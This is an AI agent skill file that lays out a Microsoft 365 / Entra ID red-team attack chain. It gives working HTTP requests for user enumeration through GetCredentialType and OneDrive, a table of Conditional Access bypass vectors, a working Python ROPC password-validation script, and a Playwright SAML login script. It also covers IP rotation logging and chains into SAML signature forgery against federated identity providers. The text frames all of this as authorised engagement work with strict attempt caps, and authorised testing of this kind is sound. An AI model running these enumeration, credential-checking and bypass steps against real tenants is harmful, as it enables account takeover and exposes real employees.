---
name: m365-entra-attack
description: Microsoft 365 / Entra ID red-team attack chain — current 2026 reality. AADSTS code reference, user enumeration vectors (GetCredentialType / OneDrive — no password), Smart Lockout math, Conditional Access bypass options, one-shot ROPC + SAML SSO browser flow when RoE authorizes credential validation. Built from authorized red-team work where a single leaked-secret check surfaced pre-existing lockouts and CA-blocked credentials, plus real-time external attacker activity correlation. Use for any M365/Entra credential attack, password spray classification (do not exhaust the keyspace), user enumeration, CA-bypass exploration, or active-attacker-detection scenario.
sources: authorized-engagement, microsoft-docs, AADInternals
report_count: 1
---

## When to use this skill

Trigger when:
- Target uses M365 / Entra ID (autodiscover.* records, login.microsoftonline.com redirects, "Microsoft Office 365" in tech-stack notes)
- You have a list of corporate emails or stealer-leaked creds
- Engagement involves "credential spray", "password spray", "Entra attack", "ATO via M365"
- You see `*.onmicrosoft.com`, `*-my.sharepoint.com`, `enterpriseregistration.*`, `enterpriseenrollment.*` in recon
- Client mentions "Conditional Access", "MFA bypass", "compliant device"

DO NOT use for:
- On-prem-only Active Directory (use a separate AD-attack skill)
- Service-to-service token attacks (different threat model)
- Phishing-required attack chains (covered by phishing skills) — but you can prep for the credential-validation step here

---

## Tenant discovery (msftrecon)

```bash
# For each owned domain
msftrecon -d client.example
msftrecon -d clientltd.example
msftrecon -d sister-brand-school.example
```

Key fields in output:
- **Tenant ID** (different domains may share OR have separate tenants — always test all owned domains)
- **Federation Information.Namespace Type** = `Managed` (cloud-only, ROPC works) | `Federated` (ADFS, different attack)
- **SharePoint Detected** (Yes = OneDrive enum vector available)
- **Communication Services Teams/Skype** (post-auth lateral targets)
- **Admin Consent Endpoint accessible** (consent-phishing surface)

**Red flag:** if the org has multiple Entra tenants for sister domains, each is a separate attack surface with its own user list, lockout policy, and CA configuration. Don't assume one spray covers all.

---

## AADSTS code reference (memorize)

| AADSTS | Meaning | Lockout impact | What to do |
|---|---|---|---|
| 50034 | User does not exist | None | Skip; remove from spray list |
| 50126 | Invalid username or password | +1 bad-password slot | User exists. Do not submit a second pattern. A different password counts; the same wrong password does not. |
| 50053 | Account locked (Smart Lockout) | None (already locked) | Pre-existing → flag to SOC; don't retry |
| 53003 | CA blocked token issuance | Does **not** increment the bad-password counter | **PASSWORD VALID** — STOP, password is correct |
| 53000 | Device not compliant | Does **not** increment the bad-password counter | **PASSWORD VALID** — compliant-device grant |
| 53001 | Device not hybrid-joined | Does **not** increment the bad-password counter | **PASSWORD VALID** — hybrid-join grant |
| 530003 | "Device is required to be managed" (browser string; JSON `error_codes` is often `[53000]`) | Does **not** increment the bad-password counter | **PASSWORD VALID** — match both strings |
| 50076 | MFA required | Does **not** increment the bad-password counter | **PASSWORD VALID** — second factor needed |
| 50079 | Strong auth enrollment required | Does **not** increment the bad-password counter | **PASSWORD VALID** — same class as 50076 |
| 50158 | External auth required | Does **not** increment the bad-password counter | **PASSWORD VALID** — federated MFA |
| 65001 | Consent required | +1 attempt counter | App-consent issue, not auth |
| 700016 | App not in tenant | None | User in different tenant — adjust target |
| 90002 | Tenant does not exist | None | Tenant typo / dead tenant |

**Critical insight:** any code in {53003, 53000, 53001, 530003, 50076, 50079, 50158} means **the password is correct** — Microsoft returns these after successful credential validation. Document as a confirmed-valid credential even if you cannot get a token. They are not failed-password attempts.

---

## Smart Lockout math (the cap discipline)

**Microsoft default (Azure Public and 21Vianet):** 10 failed sign-ins, then a first lockout of 60 seconds. Each later failure locks the account again and the duration grows. Microsoft does not publish the growth rate. There is no "10-minute window" in the current docs.

**Azure US Government default:** threshold **3**, same 60-second initial duration. Read the tenant's actual threshold before assuming 10.

**Same wrong password does not burn another slot.** Smart Lockout remembers recent bad-password hashes. A correct password (53003 / 53000 / 53001 / 530003 / 50076 / 50079 / 50158) is not a bad password.

The counter is shared across ROPC, SAML, IMAP, EWS, SMTP, and device code.

**Engagement discipline:**
- Password POSTs only when the rules of engagement explicitly authorize credential validation. Otherwise enumerate and stop.
- Hard cap: **1** password attempt per user per engagement, unless the RoE states a higher cap that is still under the tenant threshold. Do not walk a pattern list.
- State file with atomic writes — never let two runners race the counter. No parallel ROPC; concurrency trips IP reputation and returns false `AADSTS50053`.
- Kill switch: stop if LOCKED responses show up on users you have not yet touched, or on a user you attempted once (you cannot have reached 10, or 3, alone).

**With 1 attempt per user you cannot cause Smart Lockout** (1 < 10 and 1 < 3). Any `AADSTS50053` you see is pre-existing → `mid-engagement-ir-detection`.

---

## User enumeration — vectors + hardening status (May 2026)

### ❌ HARDENED (no longer differential)

```http
GET /getuserrealm.srf?login=<email>&xml=1
```
Returns identical XML for any email matching tenant's owned domain. **Tenant-level only, not user-level.**

```http
POST /common/GetCredentialType
{"username":"<email>", "isOtherIdpSupported":true}
```
A bare body returns `AADSTS1659001` (missing flow token) and does **not** enumerate. That is not the end of the vector. Harvest `flowToken` and `originalRequest` (`sCtx`) the way the login page does — GET the `/oauth2/authorize` or `/login` document for a first-party client id, then:

```http
POST /common/GetCredentialType HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/json

{"username":"<email>","isOtherIdpSupported":true,"flowToken":"<from login page>","originalRequest":"<sCtx>"}
```

`IfExistsResult`: `0` exists on this domain, `1` does not, `5` exists at another IdP, `6` exists in both, `2` throttled (stop; a `2` is not "user absent"). `Credentials.HasPassword` and FIDO/passkey flags are auth-method intel. This is zero password attempts and zero lockout. Re-verify per tenant; Microsoft keeps tightening it. `getuserrealm.srf` remains tenant-level only.

```http
GET /autodiscover/autodiscover.json/v1.0/<email>?Protocol=AutodiscoverV1
```
Returns identical 200 + same JSON body for any address. Hardened ~2024.

### ✅ STILL WORKS (May 2026 — track shelf life)

**OneDrive personal-site differential:**
```http
GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx HTTP/1.1
Host: <tenant>-my.sharepoint.com
```
Do **not** follow redirects (`curl -sI` / GET without `-L`). Following redirects lands both classes on a Microsoft login page and destroys the oracle.
- **Non-404** (302 to Authenticate.aspx, 401, 403, or 200 with a SharePoint/login body) → personal site **exists** → that UPN was licensed/provisioned.
- **404** → no personal site. The user may still exist (shared mailbox, never signed into OneDrive).
- ZERO password attempt → ZERO lockout impact.
- Secondary: `Sprequestduration` is often faster for existing sites — confirm with n≥10 paired samples; do not use timing alone.

**Caveats:**
- Only works if SharePoint is provisioned (msftrecon `SharePoint Detected: Yes`).
- Re-verify per tenant — Microsoft hardens these endpoints.
- 404 is a **false negative** for unlicensed / never-provisioned users, not proof of absence.

**2026-05-17 re-verification:** the primitive still works. Without `-L`, licensed users were 302/200 with a large body; nonexistent / some shared-mailbox accounts were 404 with 0 bytes. The `/personal/` root (no `/_layouts/15/onedrive.aspx`) showed the same split. A 200 you got by following redirects is not this oracle.

**Account-class signal (no password):** cross-reference OneDrive with `GetCredentialType` `IfExistsResult` (Method above — still zero lockout):

| OneDrive | GetCredentialType | Classification |
|---|---|---|
| non-404 | `IfExistsResult=0` | **Licensed user** (real employee; check `Credentials.HasPassword` / FIDO flags) |
| non-404 | `1` | Inconsistency — re-probe; do not classify |
| 404 | `0` | **Exists, no OneDrive** — shared mailbox / functional / service account. Historic MFA-exempt class. Do **not** spray it; if RoE names one leaked secret for that UPN, that is the single cap-attempt |
| 404 | `1` | Not in this tenant (for this enum path) |
| 404 | `2` | Throttled — stop |

`noreply@`, `purchase@`, `accounts@`, `postmaster@`, `transport@` are typical functional-account *candidates* once `IfExistsResult=0`. Existence is not a password oracle.

**Do not use ROPC as an enumerator.** A dummy password that returns `AADSTS50126` vs `50034` burns a Smart Lockout slot on every hit. Enumerate with GetCredentialType / OneDrive only. ROPC is the one RoE-authorized secret in the validator below.

---

## Conditional Access bypass options (most blocked, document anyway)

| Vector | Status (2026) | Notes |
|---|---|---|
| Different ROPC client_id (Microsoft Graph PowerShell vs Azure CLI vs Office) | Sometimes works | CA can be per-app; try `1b730954-1685-4b74-9bfd-dac224a7b894` (Graph PS), `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI), `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Office) |
| Different resource (graph.microsoft.com / outlook.office.com / management.azure.com) | Sometimes works | CA scope can be per-resource |
| EWS / IMAP / POP3 / SMTP Basic Auth | Mostly disabled | MS deprecated Basic Auth Oct 2022; per-account exceptions exist |
| FOCI (Family of Client IDs) | Token-refresh path (shrinking) | Jan 2026: Azure CLI (`04b07795-…`) and Azure PowerShell refresh tokens stopped being reusable — treat those two as **out of the family**. Office/Teams/Outlook Mobile/Company Portal may still mint for each other. Prove per `client_id` you actually refreshed; a `foci` claim in the token response is the membership signal. Do not claim a CLI/PS CA bypass on a 2026+ tenant without a live token |
| Device-code phishing | Works | Requires user-side interaction (OOS for many engagements) |
| Compliant-device emulation | Hard | Requires Intune device registration — high effort, often impossible without insider |
| AiTM session-cookie steal | Works (with phishing) | Modern primary technique — out of scope for non-phishing engagements |
| FOCI + Family Refresh Token Theft | Post-auth | Requires already having a token |
| SAML SSO via different SP | Sometimes | Each enterprise app has its own CA policy; an app with weaker CA = pivot |
| Geo-bypass via VPN | Sometimes | If "trusted location" CA policy includes corp HQ IPs, use a VPN exit there |

On a tenant where every client id you are allowed to try returns `AADSTS53003`, the password is valid and that path will not issue a token. That was one engagement's result. Do not treat it as universal: a different client id or resource can sit outside the policy. Show the 53003 (or the token) per client id you actually sent. Phishing for a session cookie is out of scope unless the RoE allows it.

---

## ROPC password validation (one authorized attempt)

Run this only when the RoE authorizes credential validation. It classifies a single secret. It is not a sprayer.

**Single-attempt validator pattern (Python):**

```python
import urllib.request, urllib.parse, ssl, time, json, os
ctx = ssl.create_default_context()
ATTEMPT_FILE = "engagement_log/o365_attempts.json"
HARD_CAP = 1  # raise only if the RoE says so and the tenant threshold is known to be higher

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    state[email.lower()] = state.get(email.lower(), 0) + 1
    json.dump(state, open(ATTEMPT_FILE+".tmp", "w"))
    os.replace(ATTEMPT_FILE+".tmp", ATTEMPT_FILE)  # atomic
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body, method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=15)
        body = json.loads(r.read())
        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
        if "access_token" in body:    # ← JSON key check, NOT substring
            return {"status": "VALID", "body": body}
        return {"status": "STATUS_200_NO_TOKEN", "body": body}
    except urllib.error.HTTPError as e:
        msg = e.read().decode(errors="ignore")
        for code, status in [
            ("AADSTS50034", "INVALID_USER"),
            ("AADSTS50126", "INVALID_PW"),
            ("AADSTS50053", "LOCKED"),
            ("AADSTS53003", "VALID_CA_BLOCK"),
            ("AADSTS53000", "VALID_DEVICE_CA"),
            ("AADSTS53001", "VALID_DEVICE_CA"),
            ("AADSTS530003", "VALID_DEVICE_CA"),
            ("AADSTS50076", "VALID_MFA"),
            ("AADSTS50079", "VALID_MFA"),
        ]:
            if code in msg:
                return {"status": status, "code": code}
        return {"status": "OTHER", "msg": msg[:200]}
```

### ⚠ CRITICAL TRAP — AADSTS50076 body contains literal `"access_token"` substring

When CA policy requires MFA and ROPC cannot satisfy it, Entra returns an error body that INCLUDES a `claims` field listing CA policy IDs as a step-up challenge:

```json
{
  "error": "invalid_grant",
  "error_description": "AADSTS50076: ...you must use multi-factor authentication...",
  "error_codes": [50076],
  "suberror": "basic_action",
  "claims": "{\"access_token\":{\"capolids\":{\"essential\":true,\"values\":[\"<policy-id-1>\",\"<policy-id-2>\"]}}}"
}
```

**The `"access_token"` substring appears inside the CA claims challenge JSON.** A loose substring check `if "access_token" in raw_body:` will false-positive every MFA-blocked attempt as a successful token issuance.

**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This was discovered in the 2026-05-17 authorized-engagement revalidation where a substring check produced 7 false-positive "CA bypasses" on Sway/Yammer/Bookings/Tunnel client_ids that were actually all enforcing MFA correctly.

The `claims.access_token.capolids` values are tenant-internal Conditional Access policy IDs — useful recon enrichment, but NOT a token. Document them in engagement notes as "CA policy IDs that fired" — they're a defender-side breadcrumb, not an attacker-side win.

**Pace (only after the RoE authorizes credential checks):**
- Serial only. Do not parallelize ROPC or other password grants — concurrent calls trip Entra IP reputation, return false `AADSTS50053`, and contaminate the lockout diff.
- Per-user cap in the state file is the control. Do not target a request rate.
- Jitter between authorized attempts. Enumeration (`GetCredentialType`, OneDrive HEAD/GET) is not a password attempt; still back off on `IfExistsResult` `2` or HTTP 429.

---

## SAML SSO browser flow (for definitive cred validation when CA blocks ROPC)

When ROPC returns AADSTS53003, you've proven the password. To prove it across BOTH auth paths (and capture Microsoft's CA-block page as evidence), walk SAML SSO via Playwright:

```python
import asyncio
from playwright.async_api import async_playwright

async def saml_validate(target_sp_url, username, password, screenshot_dir):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        # Step 1: navigate to SP
        await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
        # Step 2: click sign-in (selectors vary per SP)
        for sel in ["button:has-text('Sign in')", "a:has-text('Login')", "button:has-text('Azure')"]:
            try:
                await page.locator(sel).first.click(timeout=3000)
                break
            except: continue
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 3: submit username at Microsoft
        await page.locator('input[name="loginfmt"], input[type="email"]').first.fill(username)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 4: submit password
        await page.locator('input[name="passwd"], input[type="password"]').first.fill(password)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=30000)
        # Step 5: capture
        await page.screenshot(path=f"{screenshot_dir}/saml_final.png", full_page=True)
        content = await page.content()
        cookies = await context.cookies()
        await browser.close()
        # Check outcome
        low = content.lower()
        if "convergedconditionalaccess" in low or "53003" in low:
            return "CA_BLOCKED"  # cred valid, CA wall
        elif "verify your identity" in low or "approve sign in" in low:
            return "MFA_REQUIRED"  # cred valid, MFA wall
        elif "we couldn't sign you in" in low or "wrong" in low:
            return "INVALID"
        elif "<post-auth-landing-marker>" in low or "dashboard" in low:
            return "FULL_SUCCESS"  # session obtained (replace marker per target app)
        return "UNCLEAR"
```

Microsoft's `ConvergedConditionalAccess` page (PageID in source) is the definitive evidence of CA-block.

---

## Active-attacker detection via lockout differential

If you see `AADSTS50053` (LOCKED) on multiple users despite your 1-attempt-per-user cap:
1. **You did not cause these locks** (math: 1 < 10).
2. **An external attacker is actively spraying the tenant.**
3. **Cluster the locked users alphabetically — if they cluster, attacker is using a sorted username list.**
4. **Diff lockout count between spray-start and spray-end** — new locks during your session = attacker is active *right now*.
5. **Document the locked email list as a finding** (SOC actionable — they pull sign-in logs for those users).

This is the **highest-impact byproduct** of any M365 spray engagement. Always track and report.

---

## Credential validation — one secret, not a list

Do **not** generate or walk a password pattern list (brand+year, season+year, city, employee-id, phone fragments, `Welcome@<year>`). That is keyspace exhaustion.

When the RoE explicitly allows credential validation, the only secrets that may be submitted are:

- one client-supplied leaked pair **for that user** (stealer log the client handed you), or
- one known org/framework default, if the RoE names it.

Each of those is the single cap-attempt for that user. No second pattern "while you are there". If the RoE does not authorize password attempts, do not POST `grant_type=password` at all.

---

## Engagement journaling (mandatory)

Every M365 attempt logs to JSONL:
```json
{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
```

**Per-user tracker** (atomic):
```json
{"user1@<client>.example": 1, "user2@<client>.example": 1, ...}
```

**IP rotation log** (per-day):
```
2026-05-08	<src-ip>	<ISP-AS>	<operator-handle>	Round 2 spray
```

These three artifacts are deliverable evidence for the report. They survive into the next engagement as state.

---

## Real-world findings template (from authorized-engagement)

For the report:

**Finding: `<N>` Entra accounts in pre-existing lockout state**
- Subject: Active external password-spray campaign detected
- Evidence: the engagement journal filtered to `status=LOCKED`. `<N>` comes from that file — never reuse a count from a previous engagement.
- Math: 1 attempt per user cannot reach a threshold of 10 (public) or 3 (US Gov). Attribute only locks that were already present, or that accumulated on users this run did not attempt.
- SOC action: pull sign-in logs for those `<N>` accounts over the last 30-60 days

**Finding: Valid M365 cred — `<user>:<password>` (CA-blocked)**
- Subject: Confirmed valid credential
- Evidence: ROPC AADSTS53003 + SAML SSO `ConvergedConditionalAccess` page screenshot
- Microsoft documentation excerpt: "AADSTS53003 returned only after password validation"
- Recommendation: force password reset, audit org-wide for similar pattern

---

## Anti-patterns (don't do these)

- **DON'T use the leaked cred for the user across multiple resources** — burns the cap with no marginal benefit when CA blocks all paths
- **DON'T retry after AADSTS50053** — account is locked, you'll just see lockout again
- **DON'T run a password pattern list or parallel ROPC** — one authorized secret per user, serial. A high attempt rate is credential stuffing, not a test.
- **DON'T forget to test ALL Entra tenants** — sister domains often have separate tenants with different password policies
- **DON'T retract a CA-block finding** — AADSTS53003 means the password is correct; that's the whole point

---

## Tooling

```bash
pip install --break-system-packages msftrecon  # clone from GitHub if the package name 404s. Do not install o365spray — it is a sprayer; this skill classifies one secret.
brew install pandoc                                       # for report generation
go install -v github.com/projectdiscovery/...             # PD toolkit for general recon
```

Pre-built `m365_validator.py` template at engagement working directory `engagement_log/m365_validator.py`. Adapt the `attempt()` function to your engagement.

---

## Related Skills & Chains

- **`hunt-mfa-bypass`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
- **`hunt-ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
- **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
- **`hunt-saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `hunt-saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
- **`redteam-report-template`** — M365 findings need clear tenant/user/CA-policy framing because the blast radius is "every Microsoft service the org uses." Chain primitive: validated finding from this skill → run through `triage-validation` 7-Question Gate → package via `redteam-report-template` with explicit blast-radius (which apps, which users, which data) for client deliverable.
